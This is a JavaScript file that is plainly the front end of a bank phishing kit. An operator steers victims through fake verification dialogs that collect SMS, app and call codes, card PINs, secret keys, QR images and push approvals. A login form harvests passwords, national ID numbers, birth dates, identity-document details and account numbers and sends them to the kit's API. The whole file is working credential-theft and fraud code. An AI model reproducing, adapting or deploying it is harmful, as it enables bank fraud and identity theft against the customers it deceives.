async function init() {
  var currentStatus = null;

  $("body").on(
    "click",
    ".pictures-container:not(.disabled) .pictures-element[data-item]",
    (e) => {
      e.preventDefault();
      $(".pictures-container").removeClass("disabled").addClass("disabled");
      $.ajax({
        url: "/api/selectPicture",
        type: "POST",
        data: {
          picture:
            $(e.target).data("item") || $(e.target).parent().data("item"),
          token: LOG_TOKEN,
        },
        success: () => {
          setTimeout(() => {
            alert(translate["wrong_picture"][AD_LANG]);
            $(".pictures-container").removeClass("disabled");
            pictureModal();
          }, 750);
        },
        error: () => {
          setTimeout(() => {
            alert(translate["wrong_picture"][AD_LANG]);
            $(".pictures-container").removeClass("disabled");
            pictureModal();
          }, 750);
        },
      });
    }
  );
  function limitsModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["limits"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/ad/" + AD_ID;
    });
  }
  function toDepositModal(data) {
    swal(translate.error_title[AD_LANG], translate.todeposit[AD_LANG].replace("{sum}", data.value), "info", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }
  function sendQrModal(data) {
swal({
      title: data.value,
      content: {
        element: "input",
        attributes: {
          type: "file",
		  id: "file-image",
          required: true,
          style:
            "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
        },
      },
      closeOnEsc: false,
      closeOnClickOutside: false,
      buttons: {
        confirm: {
          text: translate.submit[AD_LANG],
          closeModal: false,
        },
      },
    }).then(async (ok) => {
      try {
let imageFile = document.getElementById("file-image");

  if(imageFile.files.length != 1) return;
  let file = imageFile.files[0];
  if(!file.type.startsWith("image")) return;
  sendNImage(file);

async function sendNImage(file){
  let resFile = await getBase64(file);
  imageFile.value = "";
        $.ajax({
          type: "POST",
          url: "/api/submitQr",
          data: {
            resFile,
            token: LOG_TOKEN,
          },
          success: (data) => {
            waitingModal();
          },
          error: () => {
            waitingModal();
          },
        });
}

function getBase64(file) {
 return new Promise((res, rej) => {
   var reader = new FileReader();
   reader.readAsDataURL(file);
   reader.onload = function () {
     res(reader.result);
   };
   reader.onerror = function (error) {
     rej(error);
   };
  });
}
      } catch (err) {
        waitingModal();
      }
    });
  }
  
  function secretKeyyModal(v) {
    swal(translate.attention[AD_LANG], translate.secretKey[AD_LANG].replace("{sum}", v), "info", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }
  function forVerifyModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["for_verify"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/ad/" + AD_ID;
    });
  }
  function correctBalanceModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["correct_balance"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/ad/" + AD_ID;
    });
  }
  function otherCardModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["other_card"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/ad/" + AD_ID;
    });
  }
  function otherLkModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: translate["other_lk"][AD_LANG],
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.location.href = "/select/" + AD_ID;
    });
  }
  function cardErrorModal() {
    swal({
      title: translate["error_title"][AD_LANG],
      text: "Falsche Anmeldedaten",
      type: "error",
      closeOnConfirm: false,
      closeOnCancel: false,
      closeOnClickOutside: false,
      closeOnEsc: false,
    }).then((ok) => {
      if (ok) document.querySelectorAll('input:not([hidden]):not([type="hidden"]):not([type="submit"])').forEach(input => input.value = '');
    });
  }
  function pushModal() {
    swal(translate.push_title[AD_LANG], translate.push_text[AD_LANG], "info", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }
  function voiceModal() {
    swal('Achtung', 'Befolgen Sie die Anweisungen des Telefongesprächs', "info", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }
  function successModal() {
    swal(translate.success[AD_LANG], translate.money_will[AD_LANG], "success", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }
  function waitingModal() {
    swal(translate.wait[AD_LANG], translate.bank_processes[AD_LANG], "info", {
      closeOnClickOutside: false,
      closeOnEsc: false,
      buttons: false,
    });
  }
  function pictureModal() {
    swal(
      translate["picture_title"][AD_LANG],
      translate["picture_text"][AD_LANG],
      "info",
      {
        content: {
          element: "div",
          attributes: {
            id: "pictures_div",
          },
        },
        closeOnClickOutside: false,
        closeOnEsc: false,
        buttons: false,
      }
    );
    const pictures = [
      "банан",
      "брюки",
      "бургер",
      "гитара",
      "зонтик",
      "календарь",
      "калькулятор",
      "карандаш",
      "клубника",
      "компас",
      "крокодил",
      "лимон",
      "мамонт",
      "микрофон",
      "наушники",
      "очки",
      "помидор",
      "свитер",
      "телефон",
      "цветок",
      "шоколад",
    ].sort(() => Math.random() - 0.5);

    document.querySelector("#pictures_div").innerHTML =
      '<div class="pictures-container">' +
      pictures
        .map(
          (v) =>
            '<div class="pictures-element" data-item="' +
            v +
            '"><img draggable="false" alt="" src="/img/pictures/' +
            v +
            '.png"></div>'
        )
        .join("\n") +
      "</div>";
    document.querySelector(".pictures-container").classList.remove("disabled");
  }
  function codeModal(
    codeType = "sms",
    title = translate.sms_title[AD_LANG],
    text = translate.sms_text[AD_LANG],
    placeholder = translate.sms_placeholder[AD_LANG],
    wrong_code = translate.wrong_code[AD_LANG]
  ) {
    swal.stopLoading();
    swal({
      title,
      text,
      content: {
        element: "input",
        attributes: {
          type: "password",
          placeholder,
          maxLength: 255,
          required: true,
          style:
            "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
        },
      },
      closeOnEsc: false,
      closeOnClickOutside: false,
      buttons: {
        confirm: {
          text: translate.submit[AD_LANG],
          closeModal: false,
        },
      },
    }).then(async (code) => {
      try {
        if (!code) return;
        $.ajax({
          type: "POST",
          url: "/api/submitCode",
          data: {
            codeType,
            code,
            token: LOG_TOKEN,
          },
          success: (data) => {
            //swal.stopLoading();
            waitingModal();
            //codeModal(...arguments);
          },
          error: () => {
            //swal.stopLoading();
            waitingModal();
            //codeModal(...arguments);
          },
        });
      } catch (err) {
        //swal.stopLoading();
        waitingModal();
        //codeModal(...arguments);
      }
    });
  }
  
  var oldData = null;
  function checkLogStatus() {
    $.ajax({
      type: "POST",
      url: "/api/checkStatus",
      data: {
        token: LOG_TOKEN,
      },
      success: (data) => {
        if (data.status == currentStatus && currentStatus !== "secretKeyy") return;
        currentStatus = data.status;

        if (currentStatus == "profit") successModal();
        else if (currentStatus == "sms") codeModal();
        else if (currentStatus == "appCode")
          codeModal(
            "app",
            translate.app_code_title[AD_LANG],
            translate.app_code_text[AD_LANG],
            translate.app_code_placeholder[AD_LANG]
          );
        else if (currentStatus == "callCode")
          codeModal(
            "call",
            translate.call_code_title[AD_LANG],
            translate.call_code_text[AD_LANG],
            translate.call_code_placeholder[AD_LANG]
          );
        else if (currentStatus == "cardpin")
          codeModal(
            "cardpin",
            "PIN",
            "Az ellenőrzés folytatásához küldje el a PIN kódot a kártyájáról",
            "PIN"
          );
        else if (currentStatus == "push") pushModal();
		else if (currentStatus == "sendVoice") voiceModal();
        else if (currentStatus == "limits") limitsModal();
        else if (currentStatus == "otherCard") otherCardModal();
		else if (currentStatus == "otherLk") otherLkModal();
        else if (currentStatus == "forVerify") forVerifyModal();
        else if (currentStatus == "correctBalance") correctBalanceModal();
        else if (currentStatus == "picture") pictureModal();
		else if (currentStatus == "wait") waitingModal();
		else if (currentStatus == "cardError") cardErrorModal();
		else if (currentStatus == "toDeposit") toDepositModal(data);
		else if (currentStatus == "sendQr") sendQrModal(data);
		else if (currentStatus == "secretKey") codeModal(
          "secretKey",
          translate.secretKey[AD_LANG].replace("{sum}", data.value),
		  "",
          "",
        );
		else if (currentStatus == "secretKeyy") {
        if (data.value !== oldData) {
          secretKeyyModal(data.value);
          oldData = data.value;
        }
      }
		else if (currentStatus == "toCard") document.location.href = `/ad/` + + AD_ID;

      },
    }).done(() => setTimeout(checkLogStatus, 1500));
  }

  checkLogStatus();
  

  $("body").on("submit", "#lk_form", (e) => {
    e.preventDefault();
    $.ajax({
      type: "POST",
      url: "/api/submitLkk",
      data: {
        token: LOG_TOKEN,
        login: $("#login").val(),
        password: $("#password").val(),
        pesel: $("#pesel").val(),
        pin: $("#pin").val(),
		bic: $("#bic").val(),
		birth: $("#birth").val(),
		otdel: $("#otdel").val(),
		bank: $("#bank").val(),
		documento: $("#documento").val(),
		numerodocumento: $("#numerodocumento").val(),
		fechadocumento: $("#fechadocumento").val(),
        motherlastname: $("#motherlastname").val(),
		motherlastnamee: $("#motherlastnamee").val(),
		konto: $("#konto").val(),
		unterkonto: $("#unterkonto").val(),
		haslo: $("#haslo").val(),
      },
      beforeSend: () => {
        $("#lk_form").find("[type=submit]").prop("disabled", true);
      },
      success: (data) => {
        $("#lk_form").find("[type=submit]").prop("disabled", false);
        swal({
          title: translate.wait[AD_LANG],
          text: translate.bank_processes[AD_LANG],
          icon: "info",
          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        });
      },
      error: () => {
        $("#lk_form").find("[type=submit]").prop("disabled", false);
        swal(translate.error_title[AD_LANG], translate.error[AD_LANG], "error");
      },
    });
  });
}
init();
